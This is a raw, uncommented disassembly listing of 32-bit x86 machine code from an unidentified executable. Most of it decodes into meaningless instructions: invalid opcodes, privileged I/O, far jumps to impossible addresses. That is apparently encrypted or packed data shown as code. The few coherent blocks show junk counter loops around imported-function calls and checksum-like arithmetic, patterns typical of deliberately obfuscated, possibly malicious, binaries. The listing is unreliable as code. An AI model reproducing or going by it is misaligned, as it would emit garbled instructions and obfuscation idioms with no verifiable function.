  40e1e2:	std    
  40e1e3:	lock inc ebx
  40e1e5:	pop    edx
  40e1e6:	mov    ds:0xf3c2ab16,al
  40e1eb:	mov    ds:0x72f243bf,al
  40e1f0:	push   ss
  40e1f1:	pop    ss
  40e1f2:	inc    esp
  40e1f3:	lock and dh,bh
  40e1f6:	push   edx
  40e1f7:	repz mov bh,0xaa
  40e1fa:	hlt    
  40e1fb:	and    BYTE PTR [edx-0x4582a926],cl
  40e201:	test   al,0xb5
  40e203:	daa    
  40e204:	lock cmp cl,BYTE PTR [ecx-0x60ecf369]
  40e20b:	mov    cl,BYTE PTR [esp+edi*4]
  40e20e:	daa    
  40e20f:	daa    
  40e210:	dec    ecx
  40e211:	iret   
  40e212:	inc    eax
  40e213:	inc    edi
  40e214:	popa   
  40e215:	shl    BYTE PTR [ecx+ebp*2],0x64
  40e219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e21a:	popa   
  40e21b:	xchg   esi,eax
  40e21c:	xchg   DWORD PTR [eax],ebp
  40e21e:	fidiv  DWORD PTR [ecx+0x37]
  40e221:	mov    al,ds:0xd319a25b
  40e226:	sub    al,0x7e
  40e228:	push   edx
  40e229:	scas   al,BYTE PTR es:[edi]
  40e22a:	sbb    eax,0xb50e3540
  40e22f:	jb     0x40e1d1
  40e231:	sbb    eax,0x48e52ea6
  40e236:	or     esi,DWORD PTR [bp+di+0x68]
  40e23a:	in     al,dx
  40e23b:	leave  
  40e23c:	bound  edi,QWORD PTR [esi-0x681be5ec]
  40e242:	mov    esi,0xccd9a5cf
  40e247:	xor    eax,0xc2f2e602
  40e24c:	xchg   edx,eax
  40e24d:	and    al,0x6e
  40e24f:	mov    eax,0xea84a560
  40e254:	daa    
  40e255:	push   esp
  40e256:	pop    ebp
  40e257:	dec    edx
  40e258:	jg     0x40e272
  40e25a:	xor    al,0x14
  40e25c:	sub    DWORD PTR [edx],ebx
  40e25e:	jecxz  0x40e1f9
  40e260:	cmp    bh,BYTE PTR [eax+edi*2-0x2fb3b0f9]
  40e267:	inc    edi
  40e268:	cdq    
  40e269:	dec    esi
  40e26a:	jl     0x40e27a
  40e26c:	jecxz  0x40e2c7
  40e26e:	push   edx
  40e26f:	(bad)
  40e272:	rcr    BYTE PTR [edi+eiz*1-0x51ba5269],0x89
  40e27a:	add    DWORD PTR [ebp+0x2581fc45],ecx
  40e280:	std    
  40e281:	cld    
  40e282:	inc    edx
  40e283:	add    BYTE PTR [eax],al
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [ebx+0x42fcfd0d],cl
  40e28d:	add    BYTE PTR [ecx-0x77],al
  40e290:	or     eax,0x42fcfd
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	push   edx
  40e377:	sub    DWORD PTR [ebx+0x70a43b42],ebp
  40e37d:	jo     0x40e342
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e30c
  40e383:	rcr    DWORD PTR ds:0xc73fb046,0x93
  40e38a:	pop    edx
  40e38b:	outs   dx,BYTE PTR ds:[esi]
  40e38c:	add    DWORD PTR [ebp+edi*4+0x38],edi
  40e390:	mul    DWORD PTR [ebp-0x7fe17a17]
  40e396:	dec    ebp
  40e397:	push   ds
  40e398:	call   0xea8b81e4
  40e39d:	pop    DWORD PTR [edi]
  40e39f:	or     DWORD PTR [ecx],ebx
  40e3a1:	xlat   BYTE PTR ds:[ebx]
  40e3a2:	xchg   edx,eax
  40e3a3:	lock sti 
  40e3a5:	test   DWORD PTR [ebx],ebx
  40e3a7:	test   DWORD PTR [edx],ebx
  40e3a9:	(bad)  
  40e3aa:	outs   dx,BYTE PTR ds:[esi]
  40e3ab:	int    0x28
  40e3ad:	test   DWORD PTR [edx],ecx
  40e3af:	jns    0x40e388
  40e3b1:	mov    eax,0x6dc859bd
  40e3b6:	xor    WORD PTR [edi-0x9],ax
  40e3ba:	in     eax,0x3c
  40e3bc:	mov    al,0x81
  40e3be:	fistp  QWORD PTR [edx]
  40e3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3c1:	mov    DWORD PTR [eax+0x74],ebp
  40e3c4:	pop    edx
  40e3c5:	call   ecx
  40e3c7:	into   
  40e3c8:	and    esp,esp
  40e3ca:	in     al,dx
  40e3cb:	inc    DWORD PTR [ecx-0x4849fa44]
  40e3d1:	and    al,0x7b
  40e3d3:	(bad)  
  40e3d4:	outs   dx,BYTE PTR ds:[esi]
  40e3d5:	out    dx,eax
  40e3d6:	lock xchg DWORD PTR [esi-0x4],esi
  40e3da:	stc    
  40e3db:	(bad)  
  40e3dc:	icebp  
  40e3dd:	es mov ebp,0x90cb1b77
  40e3e3:	xchg   ebx,eax
  40e3e4:	and    BYTE PTR ds:0x8adf650c,al
  40e3ea:	sbb    BYTE PTR [ecx-0x40],al
  40e3ed:	adc    DWORD PTR [edx+eax*8],0x158df5fe
  40e3f4:	out    0xa6,al
  40e3f6:	pop    esi
  40e3f7:	test   al,0xd8
  40e3f9:	sub    ebp,0xb856fa00
  40e3ff:	sub    eax,0x1266214c
  40e404:	mov    DWORD PTR [edx],esp
  40e406:	sbb    DWORD PTR [ecx-0x5e],ebx
  40e409:	inc    esp
  40e40a:	in     al,dx
  40e40b:	test   eax,0x90f27286
  40e410:	jmp    0x40e3cb
  40e412:	mov    ebx,0xc2b70cf3
  40e417:	jecxz  0x40e3ea
  40e419:	adc    ebp,DWORD PTR [ebx]
  40e41b:	cmp    ah,BYTE PTR [esi-0x20]
  40e41e:	ins    DWORD PTR es:[edi],dx
  40e41f:	push   0x2d
  40e421:	lea    edi,[edi+0x3862d366]
  40e427:	addr16 call 0x2312:0x1cf1c1c6
  40e42f:	jmp    0x40e473
  40e431:	popa   
  40e432:	hlt    
  40e433:	les    eax,FWORD PTR [edx-0x2c658c70]
  40e439:	add    bh,BYTE PTR ds:[esi+0x4900e931]
  40e440:	mov    dh,0xcd
  40e442:	nop
  40e443:	iret   
  40e444:	cmp    DWORD PTR [eax],ecx
  40e446:	rcr    DWORD PTR [edi-0xf],1
  40e449:	mov    ebx,0x47c1b351
  40e44e:	inc    ebx
  40e44f:	and    al,0x5b
  40e451:	mov    DWORD PTR [ebp-0x55e7a517],eax
  40e457:	sbb    eax,0x75dba4aa
  40e45c:	shl    BYTE PTR [edi+0x53],0x3c
  40e460:	gs or  al,0x4a
  40e463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e464:	idiv   esi
  40e466:	sbb    BYTE PTR [ecx+0x2beecde9],0xa2
  40e46d:	pushf  
  40e46e:	sub    al,0xaa
  40e470:	xlat   BYTE PTR ds:[ebx]
  40e471:	pop    DWORD PTR [ebp-0x5ee88e32]
  40e477:	adc    DWORD PTR [eax-0x52],esi
  40e47a:	ds clc 
  40e47c:	xchg   ebp,eax
  40e47d:	(bad)  
  40e47e:	test   al,0xc5
  40e480:	cmp    bh,BYTE PTR [edx-0x2c]
  40e483:	clc    
  40e484:	jo     0x40e4c2
  40e486:	lahf   
  40e487:	call   0x52c5:0x5721dd87
  40e48e:	push   ds
  40e48f:	out    dx,eax
  40e490:	(bad)  
  40e491:	data16 loop 0x40e48a
  40e494:	(bad)  
  40e495:	xor    eax,0xaf7ba3bd
  40e49a:	rcr    DWORD PTR [edx-0x4],cl
  40e49d:	imul   esp,DWORD PTR [ebx],0xffffffd0
  40e4a0:	ffreep st(5)
  40e4a2:	sbb    eax,0xa42927be
  40e4a7:	and    al,cl
  40e4a9:	cmp    DWORD PTR [ebx-0x49d4c988],esi
  40e4af:	cmp    BYTE PTR [ebx-0x4f83102c],0xfe
  40e4b6:	shr    BYTE PTR [eax-0x52a82c39],0xe9
  40e4bd:	aaa    
  40e4be:	mov    WORD PTR [ebx+0x52a2133c],es
  40e4c4:	jae    0x40e46a
  40e4c6:	push   esi
  40e4c7:	sti    
  40e4c8:	imul   esi,DWORD PTR [esi+0xaf29e39],0xe845c79c
  40e4d2:	xor    DWORD PTR [ebp-0x1c7e0764],eax
  40e4d8:	call   0xe845:0x8d000039
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x2fc740f
  40e4f5:	fsubp  st(1),st
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	add    ebp,edx
  40e501:	mov    dl,0x33
  40e503:	cmc    
  40e504:	cmp    al,0x45
  40e506:	(bad)  
  40e507:	fnstcw WORD PTR ds:0x48bfd2b9
  40e50d:	call   0xb6b9:0xc1bf8069
  40e514:	push   es
  40e515:	in     al,0xce
  40e517:	push   ds
  40e518:	and    DWORD PTR [eax],ebp
  40e51a:	or     al,0x57
  40e51c:	xchg   esp,eax
  40e51d:	or     dl,ch
  40e51f:	mov    ebx,0x9c4dd03
  40e524:	cmp    BYTE PTR ds:[ebx-0x5795e6a2],dh
  40e52b:	lods   al,BYTE PTR ds:[esi]
  40e52c:	jnp    0x40e524
  40e52e:	mov    DWORD PTR [ecx-0x101ad282],esp
  40e534:	loope  0x40e4d4
  40e536:	mov    eax,ds:0xd80fda33
  40e53b:	sahf   
  40e53c:	ret    0x69fd
  40e53f:	aas    
  40e540:	jns    0x40e564
  40e542:	dec    ebx
  40e543:	mov    ?,WORD PTR [esi-0xc1e9d54]
  40e549:	sub    ebx,edx
  40e54b:	adc    bl,BYTE PTR [ecx]
  40e54d:	iret   
  40e54e:	mov    bl,0x37
  40e550:	adc    al,BYTE PTR [edx-0x4b]
  40e553:	ret    
  40e554:	not    al
  40e556:	stos   BYTE PTR es:[edi],al
  40e557:	mov    bh,0xb
  40e559:	xor    BYTE PTR [ecx+0x20ce7d76],dh
  40e55f:	int3   
  40e560:	lock dec ebp
  40e562:	repnz mov BYTE PTR [ebx-0x69],ch
  40e566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e567:	push   ss
  40e568:	mov    edi,eax
  40e56a:	jne    0x40e56d
  40e56c:	dec    esp
  40e56d:	jmp    0x6bf857d3
  40e572:	adc    BYTE PTR [edi],0xd4
  40e575:	lahf   
  40e576:	sbb    eax,0x521fbce8
  40e57b:	out    0xf7,al
  40e57d:	jp     0x40e570
  40e57f:	sbb    BYTE PTR [esi],cl
  40e581:	mov    ebx,edi
  40e583:	scas   al,BYTE PTR es:[edi]
  40e584:	ror    BYTE PTR [edi+0x6],1
  40e587:	or     cl,BYTE PTR ds:0xc3cc80a6
  40e58d:	xchg   esi,eax
  40e58e:	dec    edi
  40e58f:	nop
  40e590:	add    DWORD PTR [ebp+eax*1-0x1e4aab37],edi
  40e597:	mov    DWORD PTR ds:0x66c2fbe8,esp
  40e59d:	xor    edx,ebp
  40e59f:	jae    0x40e5c2
  40e5a1:	inc    esi
  40e5a2:	jp     0x40e5c4
  40e5a4:	sub    esi,ebp
  40e5a6:	gs in  eax,0xe2
  40e5a9:	cli    
  40e5aa:	dec    ebx
  40e5ab:	loope  0x40e61c
  40e5ad:	mov    ds:0xb7338d84,eax
  40e5b2:	push   0x800a2039
  40e5b7:	push   ecx
  40e5b8:	icebp  
  40e5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ba:	fs inc ecx
  40e5bc:	mov    eax,0x91022238
  40e5c1:	ins    BYTE PTR es:[edi],dx
  40e5c2:	push   0x6386e9e
  40e5c7:	(bad)  
  40e5c8:	in     al,dx
  40e5c9:	repz loop 0x40e598
  40e5cc:	inc    ecx
  40e5cd:	mov    eax,ds:0x7f2fed67
  40e5d2:	shl    al,0x54
  40e5d5:	cdq    
  40e5d6:	mov    esp,0x68edb96c
  40e5db:	fiadd  WORD PTR [ecx]
  40e5dd:	dec    ebp
  40e5de:	repnz scas al,BYTE PTR es:[edi]
  40e5e0:	push   ss
  40e5e1:	push   ebx
  40e5e2:	call   0x43fcf05b
  40e5e7:	push   0x7a183f3f
  40e5ec:	mov    esp,0x29118c37
  40e5f1:	fidivr WORD PTR [edi+0x6a6bb8bd]
  40e5f7:	jo     0x40e618
  40e5f9:	push   esi
  40e5fa:	mov    al,0x11
  40e5fc:	es and al,0xa6
  40e5ff:	data16 jne 0x40e619
  40e602:	adc    cl,BYTE PTR [ecx+esi*4-0x68b5ea26]
  40e609:	fmul   QWORD PTR [ecx+0x7ccb3da]
  40e60f:	int3   
  40e610:	call   0x678b:0xd9d79a0d
  40e617:	ja     0x40e66f
  40e619:	push   esp
  40e61a:	adc    DWORD PTR ds:[bx+si-0x7e],ebp
  40e61f:	sub    BYTE PTR [edi+0x12],al
  40e622:	fisub  WORD PTR [esp+ecx*2+0x3b]
  40e626:	mov    ds:0xae37ce3b,al
  40e62b:	jno    0x40e64a
  40e62d:	imul   ecx,eax,0x8e701def
  40e633:	add    ebp,DWORD PTR [ecx]
  40e635:	sbb    eax,DWORD PTR [edi+0xf380e34]
  40e63b:	xchg   DWORD PTR [bx+si-0x121],esi
  40e640:	jmp    0x64f11567
  40e645:	dec    esp
  40e646:	pop    ds
  40e647:	pop    ds
  40e648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e649:	xchg   esp,eax
  40e64a:	inc    ecx
  40e64b:	arpl   WORD PTR [ebx+0x2581e845],cx
  40e651:	jp     0x40e650
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	pop    esi
  40e6db:	pop    edx
  40e6dc:	out    dx,al
  40e6dd:	arpl   WORD PTR [ecx-0x5e],dx
  40e6e0:	jo     0x40e752
  40e6e2:	ret    
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e6bf
  40e6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6e8:	add    ebp,ecx
  40e6ea:	inc    ecx
  40e6eb:	pop    esi
  40e6ec:	add    BYTE PTR [edi],ch
  40e6ee:	sbb    al,0x9b
  40e6f0:	and    eax,0xe7b91a48
  40e6f5:	xor    BYTE PTR [ebx-0x6e],ah
  40e6f8:	imul   esp,DWORD PTR [eax],0xffffffc3
  40e6fb:	jns    0x40e6af
  40e6fd:	xor    ebp,DWORD PTR [edi-0x3e]
  40e700:	stos   DWORD PTR es:[edi],eax
  40e701:	xlat   BYTE PTR ds:[ebx]
  40e702:	fdiv   DWORD PTR [ebp-0x81deeb9]
  40e708:	cmp    ebx,DWORD PTR [ebx+0x18]
  40e70b:	in     eax,0xb1
  40e70d:	inc    esi
  40e70e:	lock xchg ecx,eax
  40e710:	(bad)  
  40e711:	push   esi
  40e712:	xlat   BYTE PTR ds:[ebx]
  40e713:	mov    ss,WORD PTR [ebx+edi*2-0x54c57b1]
  40e71a:	mov    dl,0xfa
  40e71c:	jmp    0x9421:0xea1ffbf3
  40e723:	pop    edx
  40e724:	pop    edi
  40e725:	inc    ecx
  40e726:	call   0x9c4647ea
  40e72b:	cli    
  40e72c:	jl     0x40e77a
  40e72e:	jmp    0xe74086d9
  40e733:	sti    
  40e734:	push   ebx
  40e735:	frstor [eax+0x64e0042e]
  40e73b:	cmp    al,0x1
  40e73d:	mov    cl,0x9f
  40e73f:	addr16 aas 
  40e741:	repnz or edi,ebx
  40e744:	mov    ds:0xbfd270f6,eax
  40e749:	xchg   BYTE PTR [ecx],dl
  40e74b:	outs   dx,BYTE PTR cs:[esi]
  40e74d:	test   eax,0xd7e7cb66
  40e752:	outs   dx,DWORD PTR ds:[esi]
  40e753:	dec    ebx
  40e754:	aaa    
  40e755:	in     al,dx
  40e756:	lahf   
  40e757:	repz loope 0x40e75a
  40e75a:	pusha  
  40e75b:	xchg   BYTE PTR [ebx+0x1e1cc5ed],ah
  40e761:	aad    0x73
  40e763:	mov    esp,0xf260e8cb
  40e768:	dec    edi
  40e769:	sbb    al,0x13
  40e76b:	aad    0xc4
  40e76d:	mov    eax,ds:0xc0650cf7
  40e772:	rol    dh,cl
  40e774:	lahf   
  40e775:	xor    al,0xe1
  40e777:	mov    cl,dh
  40e779:	aaa    
  40e77a:	lods   eax,DWORD PTR ds:[esi]
  40e77b:	sub    ebp,DWORD PTR [esi]
  40e77d:	shl    BYTE PTR [edi+0x18059b34],cl
  40e783:	xchg   ecx,eax
  40e784:	cmp    eax,0xc3121c5b
  40e789:	imul   ebp,DWORD PTR [eax+0x60],0x5d8282a5
  40e790:	and    al,0x15
  40e792:	push   ecx
  40e793:	push   ebx
  40e794:	xchg   edi,eax
  40e795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e796:	inc    ebp
  40e797:	pop    ss
  40e798:	cld    
  40e799:	and    BYTE PTR [esp+edx*4],al
  40e79c:	dec    edi
  40e79d:	mov    ebp,DWORD PTR fs:[ebp+0x22818ac3]
  40e7a4:	inc    esp
  40e7a5:	push   ss
  40e7a6:	(bad)  
  40e7a8:	add    dl,BYTE PTR [edi-0x7edb6bed]
  40e7ae:	aaa    
  40e7af:	pop    edi
  40e7b0:	int    0xa5
  40e7b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7b3:	pushf  
  40e7b4:	test   eax,0xa9e9bf25
  40e7b9:	lahf   
  40e7ba:	mov    ebp,0x85064260
  40e7bf:	sub    ax,0x48b
  40e7c3:	clc    
  40e7c4:	retf   0x1dbb
  40e7c7:	lahf   
  40e7c8:	icebp  
  40e7c9:	icebp  
  40e7ca:	fmul   QWORD PTR [ecx-0x5d98303f]
  40e7d0:	and    eax,0x24ded887
  40e7d5:	jmp    0xfd38e3da
  40e7da:	jecxz  0x40e7ad
  40e7dc:	(bad)  
  40e7de:	out    dx,al
  40e7df:	outs   dx,DWORD PTR ds:[esi]
  40e7e0:	test   al,0x6e
  40e7e2:	mov    eax,0x9befd80f
  40e7e7:	arpl   WORD PTR [esi-0x27],bx
  40e7ea:	sub    DWORD PTR [ebx],esi
  40e7ec:	push   cs
  40e7ed:	rcr    DWORD PTR [eax+0x2e],0x6
  40e7f1:	icebp  
  40e7f2:	hlt    
  40e7f3:	adc    ecx,esp
  40e7f5:	push   ds
  40e7f6:	xor    BYTE PTR [esi+0x7c],dl
  40e7f9:	and    eax,edi
  40e7fb:	ins    BYTE PTR es:[edi],dx
  40e7fc:	adc    eax,0xebf3702
  40e801:	mov    dh,0xaa
  40e803:	les    ebx,FWORD PTR [ecx+0x2b]
  40e806:	adc    eax,0x3a2bcec
  40e80b:	xor    al,0x4f
  40e80d:	jo     0x40e7ab
  40e80f:	into   
  40e810:	pop    es
  40e811:	pop    ecx
  40e812:	xchg   esp,eax
  40e813:	shl    DWORD PTR [eax+0x0],0xff
  40e817:	ins    BYTE PTR es:[edi],dx
  40e818:	mov    bl,0x93
  40e81a:	xor    ebx,ebx
  40e81c:	sar    DWORD PTR [eax+0x66],cl
  40e81f:	(bad)  gs:[edi]
  40e822:	rol    BYTE PTR [eax-0x179f1d40],0x28
  40e829:	lods   eax,DWORD PTR ds:[esi]
  40e82a:	cld    
  40e82b:	das    
  40e82c:	push   ecx
  40e82d:	repz cmp cl,BYTE PTR [edx+edi*8+0x8b40d3]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	test   DWORD PTR [esi-0x5fdbb9ae],edi
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e93b
  40e956:	push   edi
  40e957:	jle    0x40e964
  40e959:	cdq    
  40e95a:	push   0xce5406a2
  40e95f:	push   esp
  40e960:	cmp    BYTE PTR [ebp-0x35],ah
  40e963:	sbb    BYTE PTR [eax+ecx*2+0x7c21f056],ch
  40e96a:	adc    DWORD PTR [edi-0x51],ebx
  40e96d:	dec    ebp
  40e96e:	out    0x8,al
  40e970:	es sub eax,0xdd9ed50b
  40e976:	gs xor eax,0x1bd78926
  40e97c:	icebp  
  40e97d:	int3   
  40e97e:	dec    ecx
  40e97f:	or     dl,BYTE PTR [ecx]
  40e981:	(bad)  
  40e982:	nop
  40e983:	(bad)  
  40e984:	jmp    0x40e9bd
  40e986:	addr16 inc edi
  40e988:	aas    
  40e989:	xchg   BYTE PTR [edx+eiz*1],bl
  40e98c:	mov    bl,0x87
  40e98e:	fstp   QWORD PTR [ebp-0x62727a79]
  40e994:	add    BYTE PTR [eax+0x49a1a48],ch
  40e99a:	out    dx,al
  40e99b:	outs   dx,BYTE PTR ds:[esi]
  40e99c:	and    BYTE PTR [esi+0x32],cl
  40e99f:	cdq    
  40e9a0:	pop    ss
  40e9a1:	fcomi  st,st(5)
  40e9a3:	push   ecx
  40e9a4:	cdq    
  40e9a5:	retf   
  40e9a6:	push   ds
  40e9a7:	retf   0x260a
  40e9aa:	mov    ecx,0x60043839
  40e9af:	mov    BYTE PTR [edi-0x1a],ah
  40e9b2:	(bad)  
  40e9b3:	in     eax,dx
  40e9b4:	jg     0x40e9f9
  40e9b6:	push   esi
  40e9b7:	inc    ecx
  40e9b8:	inc    edi
  40e9b9:	sbb    ebx,edx
  40e9bb:	loope  0x40ea11
  40e9bd:	ret    0xfcfe
  40e9c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9c1:	les    esp,FWORD PTR [ecx+0x657d2c73]
  40e9c7:	cmp    eax,0x4b50dfe3
  40e9cc:	mov    DWORD PTR [esi+0xbe671d6],eax
  40e9d2:	loope  0x40e980
  40e9d4:	fucomip st,st(2)
  40e9d6:	fistp  QWORD PTR [eax-0x2550259e]
  40e9dc:	xor    BYTE PTR [edx+0x54c5ff45],0xd7
  40e9e3:	xchg   edi,eax
  40e9e4:	std    
  40e9e5:	aaa    
  40e9e6:	retf   
  40e9e7:	adc    DWORD PTR [eax+0x76],edx
  40e9ea:	int    0x6c
  40e9ec:	arpl   WORD PTR [ecx+ebx*4-0x12a7dd9c],bp
  40e9f3:	cmp    ecx,DWORD PTR ds:0x958e0b4a
  40e9f9:	out    dx,al
  40e9fa:	sub    BYTE PTR ds:0x1374f284,bh
  40ea00:	jp     0x40e994
  40ea02:	push   ds
  40ea03:	adc    eax,0xacd63887
  40ea08:	push   eax
  40ea09:	xchg   edi,eax
  40ea0a:	sbb    eax,0x55af8fdd
  40ea0f:	jmp    0x8f56:0xc7e1a506
  40ea16:	cmp    al,0xd1
  40ea18:	shr    DWORD PTR [edi],0xb0
  40ea1b:	jns    0x40e9be
  40ea1d:	in     eax,0x20
  40ea1f:	xor    esi,DWORD PTR [esi-0x36e5bde1]
  40ea25:	leave  
  40ea26:	clc    
  40ea27:	pop    edx
  40ea28:	adc    edx,DWORD PTR [edx]
  40ea2a:	xor    DWORD PTR [eax+0x49ad4e10],edx
  40ea30:	aas    
  40ea31:	or     BYTE PTR [ebp+0x6403a6e7],0x5c
  40ea38:	mov    ch,BYTE PTR [ebp+esi*8-0x54]
  40ea3c:	adc    DWORD PTR [edi+0x72],ebx
  40ea3f:	sbb    ah,BYTE PTR [ebp-0x3d]
  40ea42:	call   0x40b6:0x9dbfec22
  40ea49:	fwait
  40ea4a:	mov    edx,0x3ec8f3e
  40ea4f:	mov    eax,ds:0x4ccbd86d
  40ea54:	jmp    0x193006e2
  40ea59:	xchg   esi,eax
  40ea5a:	ins    BYTE PTR es:[edi],dx
  40ea5b:	aaa    
